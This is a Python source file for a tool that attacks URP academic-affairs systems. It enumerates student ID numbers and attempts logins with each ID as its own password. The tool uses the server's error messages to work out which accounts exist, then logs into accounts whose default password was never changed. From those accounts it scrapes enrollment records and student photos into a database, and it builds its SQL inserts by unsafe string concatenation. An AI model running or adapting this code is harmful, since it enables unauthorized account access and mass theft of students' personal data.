# -*- coding:utf-8 -*-
"""
##############################
#                            #
#   URP 教务系统信息收集工具   #
#                            #
##############################
@author:James
Created on:18-2-8 14:25
"""

import sys
import logging
import gevent
import urllib3
import pathlib
from PIL import Image
from io import BytesIO
from lxml import etree

from URPInfoSpider import db_init
from URPInfoSpider import settings


# 账号生成器
class InfoAccount(object):
	def __init__(self):
		# 所有生成的账号
		self.accounts = []
		# 年级
		grade = settings.URP_GRADE
		# 理工
		separator = settings.URP_SEPARATOR.strip()
		# 学部
		college = range(settings.URP_COLLEGE_START, settings.URP_COLLEGE_END + 1)
		# 专业
		major = range(settings.URP_MAJOR_START, settings.URP_MAJOR_END + 1)
		# 班级
		clazz = range(settings.URP_CLASS_START, settings.URP_CLASS_END + 1)
		# 学号
		stu = range(settings.URP_STU_START, settings.URP_STU_END + 1)

		# 生成学号
		for c in college:
			for m in major:
				for cl in clazz:
					for s in stu:
						stuid = str(grade).zfill(2) + separator + str(c).zfill(2) + str(m).zfill(2) + str(cl).zfill(
							1) + str(
							s).zfill(2)
						self.accounts.append(stuid)


# 账号校验器
class InfoValidate(object):
	def __init__(self):
		self.logger = InfoMain.logger
		self.http = InfoMain.http
		# 有效账号
		self.account_valid = []
		# 可爬账号
		self.account_available = []

	def validate(self, all_account):
		# 将所有校验过程加入队列
		jobs = [gevent.spawn(self.validate_account, self.http, a) for a in all_account]
		gevent.joinall(jobs, timeout=0)

	def validate_account(self, http, account):
		# 登录请求参数
		param = {"zjh": account, "mm": account}
		headers = {
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
			'Cache-Control': 'max-age=0',
			'Connection': 'Keep-alive',
			'Host': settings.SERVER_HOST,
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
		}
		response = http.request('POST', settings.URL_LOGIN, fields=param, headers=headers)
		self.logger.info('发送请求>>{}'.format(param))
		self.logger.info(response.status)
		# 响应体解码
		res_text = response.data.decode('GB2312', 'ignore')

		if res_text.find('密码不正确') > -1:
			# 密码有误
			self.account_valid.append(account)
		elif not res_text.find('证件号不存在') > -1:
			# 账号可爬
			self.account_available.append(account)
			self.account_valid.append(account)
			self.logger.info("账号可用>>>{}".format(account))


# 信息收集器
class InfoCollect(object):
	def __init__(self):
		self.logger = InfoMain.logger
		self.http = InfoMain.http
		# 功能模块
		self.mod_get_roll_info = settings.MOD_ROLL_INFO
		self.mod_get_roll_img = settings.MOD_ROLL_IMG

	def get_info_queue(self, accounts):
		# 将所有信息收集过程加入队列
		jobs = [gevent.spawn(self.get_info, a) for a in accounts]
		gevent.joinall(jobs, timeout=0)

	def get_info(self, stuid):
		# 登录
		param = {'zjh': stuid, 'mm': stuid}
		response = self.http.request('POST', settings.URL_LOGIN, fields=param)
		# 保存 Cookie
		cookie = response.headers['Set-Cookie'].replace('; path=/', '')
		headers = {
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
			'Cache-Control': 'no-cache',
			'Connection': 'Keep-alive',
			'Cookie': cookie,
			'Host': settings.SERVER_HOST,
			'Pragma': 'no-cache',
			'Upgrade-Insecure-Requests': 1,
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
		}
		# 学籍信息
		if self.mod_get_roll_info:
			# 带 Cookie 访问学籍信息页
			response_xjxx = self.http.request('GET', settings.URL_XJXX, headers=headers)
			text = response_xjxx.data.decode('GB2312', 'ignore')
			# 解析页面内容
			selector = etree.HTML(text)
			text_arr = selector.xpath('//td[starts-with(@width,"275")]/text()')
			# 学籍信息
			result = []
			for info in text_arr:
				result.append(info.strip())
			self.save_info(result)
		# 学籍照片
		if self.mod_get_roll_img:
			response_xjzp = self.http.request('GET', settings.URL_XJZP, headers=headers)
			image = Image.open(BytesIO(response_xjzp.data))
			setpath = settings.PATH_IMG_SAVE
			path = pathlib.Path(setpath)
			if not path.exists():
				path.mkdir()
			setpath = setpath + '/' + stuid + '.jpg'
			image.save(setpath)
			self.logger.info('保存照片>>>{}'.format(setpath))

		# 登出
		self.http.request('POST', settings.URL_LOGOUT, headers=headers)

	def save_info(self, info):
		# 信息持久化
		db = InfoMain.db
		sql_str = 'INSERT INTO ' + settings.DB_TABLE_NAME + ' VALUES (NULL ,'
		for i in info:
			sql_str += "\'" + str(i) + "\'" + ','
		sql_str = sql_str[0:len(sql_str) - 1]
		sql_str += ")"
		self.logger.info(sql_str)
		db.cursor().execute(sql_str)
		db.commit()


# 主类
class InfoMain(object):
	# 日志
	logger = logging.getLogger('URPInfo')
	# 指定logger输出格式
	formatter = logging.Formatter('%(asctime)s %(levelname)-8s: %(message)s')
	# 控制台日志
	console_handler = logging.StreamHandler(sys.stdout)
	console_handler.formatter = formatter
	logger.addHandler(console_handler)
	# 日志输出级别
	logger.setLevel(logging.INFO)
	# 数据库连接
	db = db_init.connect_db()
	# HTTP 连接池
	http = urllib3.HTTPConnectionPool(
		host=settings.SERVER_HOST,
		port=settings.SERVER_PORT,
		strict=False,
		maxsize=100,
		block=False,
		retries=100,
		timeout=10
	)

	def __init__(self):
		# 日志
		self.logger = InfoMain.logger

	def autorun(self):
		account = InfoAccount()
		# 生成的所有账号
		all_account = account.accounts
		self.logger.info(all_account)
		# 校验账号是否可用
		validator = InfoValidate()
		validator.validate(all_account=all_account)
		self.logger.info(validator.account_available)
		# 获取学籍信息
		collector = InfoCollect()
		collector.get_info_queue(validator.account_available)
		# 计算
		num_sum = len(account.accounts)
		num_valid = len(validator.account_valid)
		num_available = len(validator.account_available)
		num_rate = (num_available / num_valid) * 100 if num_valid > 0 else 0
		self.logger.info(
			'总共尝试：{} 次，其中有效账号：{} 个，有效账号中用户名和密码一致的账号：{} 个，未修改密码的比例为：{:.2f}%'.format(
				num_sum, num_valid, num_available, num_rate))


if __name__ == '__main__':
	app = InfoMain()
	app.autorun()
